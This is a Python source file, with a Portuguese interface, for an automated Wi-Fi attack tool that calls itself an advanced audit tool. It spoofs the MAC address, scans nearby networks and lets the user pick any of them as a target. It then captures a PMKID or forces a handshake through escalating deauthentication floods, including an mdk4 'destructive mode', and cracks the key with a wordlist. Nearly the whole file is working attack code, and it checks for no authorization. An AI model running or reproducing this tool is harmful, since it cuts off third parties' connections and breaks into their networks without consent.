import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA DE PRÓXIMA GERAÇÃO (THEME HACKER/CYBERPUNK)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] O módulo 'rich' não foi encontrado. Execute ./run_auditor.sh para instalá-lo automaticamente.")
    exit(1)

console = Console()

# Base de Dados OUI para Identificação de Fabricante (Aumentada)
OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "00:1F:A3": "Cisco", "C0:25:06": "Cisco", "00:16:B6": "Cisco", "D0:D3:E0": "Cisco",
    "00:0C:42": "MikroTik", "E8:48:B8": "MikroTik", "48:8F:5A": "MikroTik", "64:D1:54": "MikroTik",
    "00:14:6C": "Netgear", "20:4E:7F": "Netgear", "BC:EE:7B": "Netgear", "00:24:D1": "D-Link",
    "FC:22:F4": "Zyxel", "00:19:CB": "Zyxel", "D0:54:2D": "Zyxel", "A4:91:B1": "Intelbras"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Desconhecido/Genérico")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns = []
    advice = ""
    
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "Ataque PMKID é altamente recomendado. Starlink costuma usar WPA2/WPA3 transition mode. Deauth pode falhar se PMF estiver ativo."
        vulns.append("Vulnerável a extração de PMKID via RSNIE.")
    elif "TP-Link" in vendor:
        advice = "Verifique vulnerabilidade WPS (Pixie-Dust). Muitos modelos antigos são vulneráveis."
        vulns.append("Possível falha em WPS/PIN.")
    elif "Huawei" in vendor:
        advice = "Huawei possui sistemas agressivos de WIDS. Use MAC Spoofing (já ativo)."
        vulns.append("Detecção de Deauth persistente.")
    else:
        advice = "Execute PMKID primeiro (Stealth), se falhar, use Deauth Massivo."
        
    return vulns, advice

def print_banner():
    banner = """
[bold cyan]██████╗ ███████╗██╗    ██╗    ██╗██╗███████╗██╗[/bold cyan]
[bold cyan]██╔══██╗██╔════╝██║    ██║    ██║██║██╔════╝██║[/bold cyan]
[bold blue]██║  ██║███████╗██║    ██║ █╗ ██║██║█████╗  ██║[/bold blue]
[bold blue]██║  ██║╚════██║██║    ██║███╗██║██║██╔══╝  ██║[/bold blue]
[bold magenta]██████╔╝███████║██║    ╚███╔███╔╝██║██║     ██║[/bold magenta]
[bold magenta]╚═════╝ ╚══════╝╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝[/bold magenta]
[bold white]       A U D I T O R I A   A V A N Ç A D A     [/bold white]
    """
    console.print(Panel(banner, title="[bold green]MAGISTRADO SYSTEM ONLINE[/bold green]", border_style="cyan", padding=(1, 2)))

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e:
        return None, e.stderr.strip()

def check_aircrack_ng():
    with console.status("[bold yellow]Verificando integridade do arsenal Magistrado...", spinner="bouncingBar"):
        ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver"]
        todas_instaladas = True
        for ferramenta in ferramentas:
            stdout, _ = run_command(f"dpkg -s {ferramenta}")
            if not (stdout and "install ok installed" in stdout):
                console.print(f"[bold red] [-] {ferramenta} ausente![/bold red]")
                todas_instaladas = False
    if todas_instaladas:
        console.print("[bold green] [✔] Arsenal Magistrado: Operacional.[/bold green]")
        return True
    if Confirm.ask("[bold yellow]Arsenal incompleto. Instalar agora?[/bold yellow]"):
        with console.status("[bold cyan]Instalando componentes avançados...", spinner="dots2"):
            run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger reaver", sudo=True)
            return True
    return False

def show_manual():
    manual_path = "manual_auditoria_wifi.md"
    if os.path.exists(manual_path):
        with open(manual_path, "r", encoding="utf-8") as f:
            console.print(Panel(f.read(), title="[bold yellow]MANUAL TÉCNICO EXPERT[/bold yellow]", border_style="yellow", padding=(1, 2)))
    Prompt.ask("\n[bold cyan]Pressione ENTER para retornar...[/bold cyan]")

def save_networks_log(networks):
    log_file = "redes_identificadas_log.json"
    data = {"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "total": len(networks), "redes": networks}
    try:
        todas = []
        if os.path.exists(log_file):
             with open(log_file, "r", encoding="utf-8") as f:
                  try:
                      todas = json.load(f)
                      if not isinstance(todas, list): todas = [todas]
                  except json.JSONDecodeError: pass
        todas.append(data)
        with open(log_file, "w", encoding="utf-8") as f: json.dump(todas, f, indent=4, ensure_ascii=False)
    except Exception: pass

def get_wifi_interface():
    with console.status("[bold cyan]Analisando hardware...", spinner="point"):
        stdout, _ = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    if stdout:
        interfaces = stdout.split('\n')
        table = Table(title="[bold magenta]INTERFACES DETECTADAS[/bold magenta]", show_header=True, header_style="bold cyan")
        table.add_column("ID", style="dim", justify="center")
        table.add_column("Nome", style="bold green")
        for i, interface in enumerate(interfaces): table.add_row(str(i + 1), interface)
        console.print(table)
        choice = IntPrompt.ask("[bold yellow]Selecione a interface (ID)[/bold yellow]", choices=[str(i+1) for i in range(len(interfaces))])
        return interfaces[choice - 1]
    return None

def set_monitor_mode(interface):
    stdout_check, _ = run_command(f"iw dev {interface} info")
    if stdout_check and "type monitor" in stdout_check:
        console.print(f"[bold green] [✔] {interface} já está em Modo Monitor.[/bold green]")
        return interface
    console.print(f"\n[bold yellow][MAGISTRADO LEVEL][/bold yellow] Blindagem e MAC Spoofing...")
    with console.status("[bold red]Limpando rastro e camuflando MAC...", spinner="bouncingBar"):
        run_command("rfkill unblock all", sudo=True)
        run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
        run_command("airmon-ng check kill", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"macchanger -r {interface}", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)
    with console.status("[bold cyan]Injetando Modo Monitor...", spinner="bouncingBar"):
        run_command(f"airmon-ng start {interface}", sudo=True)
        stdout_iw, _ = run_command("iw dev")
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current: return current
    return interface # Fallback

def set_managed_mode(interface):
    console.print(f"\n[bold blue]>>> Restaurando Estado Civil...[/bold blue]")
    with console.status("[bold yellow]Reiniciando serviços de rede...", spinner="dots2"):
        run_command(f"airmon-ng stop {interface}", sudo=True)
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"macchanger -p {interface}", sudo=True)
        run_command(f"iw dev {interface} set type managed", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
        run_command("nmcli networking on", sudo=True)
    console.print("[bold green] [✔] Rede Normal Restabelecida.[/bold green]")

def scan_networks(monitor_interface):
    console.print(f"\n[bold magenta]>>> RADAR MAGISTRADO ATIVADO ({monitor_interface})[/bold magenta]")
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    try: subprocess.run(f"sudo airodump-ng --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt: console.print("\n[bold yellow]>>> Radar Desligado.[/bold yellow]\n")
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if row[0].strip() == "Station MAC": break
                if in_ap:
                    bssid = row[0].strip(); essid = row[13].strip()
                    if essid and essid != "\x00":
                        networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
    if not networks: return None
    save_networks_log(networks)
    table = Table(title="[bold green]MAPA DE ESPECTRO DETALHADO[/bold green]", show_lines=True)
    table.add_column("ID", style="cyan"); table.add_column("Fabricante", style="yellow"); table.add_column("ESSID", style="bold white")
    table.add_column("BSSID", style="magenta"); table.add_column("CH", style="yellow"); table.add_column("ENC", style="red")
    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'], net['bssid'], net['channel'], net['privacy'])
    console.print(table)
    choice = IntPrompt.ask("\n[bold yellow]Selecione o Alvo (ID)[/bold yellow]", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    
    vulns, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
    console.print(Panel(f"[bold cyan]Inteligência de Alvo:[/bold cyan] {target['vendor']}\n[bold yellow]Conselho:[/bold yellow] {advice}", title="ANÁLISE EXPERT", border_style="green"))
    
    console.print("\n[bold magenta]VETOR DE ATAQUE:[/bold magenta]")
    console.print("  [1] [bold cyan]Deauth Magistrado (Aireplay/MDK4)[/bold cyan]\n  [2] [bold red]PMKID Stealth (Clientless)[/bold red]")
    target['attack_type'] = 'pmkid' if Prompt.ask("Escolha", choices=["1", "2"], default="2") == '2' else 'handshake'
    return target

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold red]Iniciando Extração PMKID Silenciosa...[/bold red]", border_style="red"))
    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=1"
    with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
        task = progress.add_task("Aguardando falha criptográfica do roteador...", total=45)
        proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        for _ in range(45):
            time.sleep(1); progress.update(task, advance=1)
        proc.terminate()
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0:
            console.print("[bold green] [✔] SUCESSO! Hash PMKID extraído.[/bold green]")
            return hashf
    return None

def capture_handshake(monitor_interface, bssid, channel, output_file):
    console.print(Panel(f"[bold yellow]Iniciando Incursão Deauth Magistrada...[/bold yellow]", border_style="yellow"))
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    for attempt in range(1, 5):
        console.print(f"\n[bold magenta]>>> VETOR DE ATAQUE {attempt}/4[/bold magenta]")
        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 8 -a {bssid} {monitor_interface}"; console.print("[cyan][*] Aireplay: Deauth direcionado...[/cyan]")
        elif attempt == 2: deauth_cmd = f"sudo aireplay-ng -0 20 -a {bssid} {monitor_interface}"; console.print("[cyan][*] Aireplay: Deauth Broadcast...[/cyan]")
        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"; console.print("[bold yellow][*] MDK4: Flood persistente...[/bold yellow]")
        else: deauth_cmd = f"sudo mdk4 {monitor_interface} d -E {bssid}"; console.print("[bold red][*] MDK4: Modo Destrutivo...[/bold red]")
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        with Progress(SpinnerColumn("dots"), TextColumn("[bold yellow]Vigiando chaves... {task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
            task = progress.add_task("", total=25)
            for _ in range(25):
                time.sleep(1); progress.update(task, advance=1)
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                    stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                    if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: console.print(f"\n[bold green] [✔] HANDSHAKE CAPTURADO![/bold green]"); break
    dump_proc.terminate(); return cap_file if handshake_found else None

def crack_hash(hash_file, wordlist_file, bssid=None):
    console.print(Panel(f"[bold red]MÓDULO DE FORÇA BRUTA ATIVADO[/bold red]", border_style="red"))
    if not os.path.exists(wordlist_file): return
    if hash_file.endswith(".16800"):
        crack_cmd = f"hashcat -m 16800 -a 0 -w 3 {hash_file} {wordlist_file}"
        if run_command("which hashcat", capture_output=True)[0] == "": crack_cmd = f"aircrack-ng -w {wordlist_file} {hash_file}"
    else: crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try: subprocess.run(crack_cmd, shell=True)
    except KeyboardInterrupt: console.print("\n[bold yellow]>>> Processo Abortado.[/bold yellow]")

def main():
    if os.geteuid() != 0: return
    while True:
        os.system("clear"); print_banner()
        console.print("\n[bold cyan]1.[/bold cyan] Iniciar Incursão Magistrada\n[bold cyan]2.[/bold cyan] Acessar Info/Manuais\n[bold cyan]3.[/bold cyan] Sair")
        opcao = Prompt.ask("\n[bold green]Ação[/bold green]", choices=["1", "2", "3"])
        if opcao == '2': show_manual(); continue
        elif opcao == '3': return
        elif opcao == '1': break
    if not check_aircrack_ng(): return
    interface = get_wifi_interface()
    if not interface: return
    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface: return
    try:
        target = scan_networks(monitor_interface)
        if not target: return
        prefix = f"capture_{target['essid'].replace(' ', '_')}"
        if target['attack_type'] == 'pmkid':
             cap_file = capture_pmkid(monitor_interface, target['bssid'], target['channel'], prefix)
             if not cap_file: console.print("\n[bold yellow]PMKID Falhou. Fallback para Deauth...[/bold yellow]"); cap_file = capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
        else: cap_file = capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
        if not cap_file: console.print(Panel("[bold red]Alvo resistiu aos ataques.[/bold red]")); return
        wordlist = Prompt.ask("\n[bold yellow]Caminho da Wordlist[/bold yellow]", default="/usr/share/wordlists/rockyou.txt")
        crack_hash(cap_file, wordlist, target['bssid'])
    except KeyboardInterrupt: console.print("\n[bold red]>>> ABORTO.[/bold red]")
    finally: set_managed_mode(monitor_interface)

if __name__ == "__main__": main()
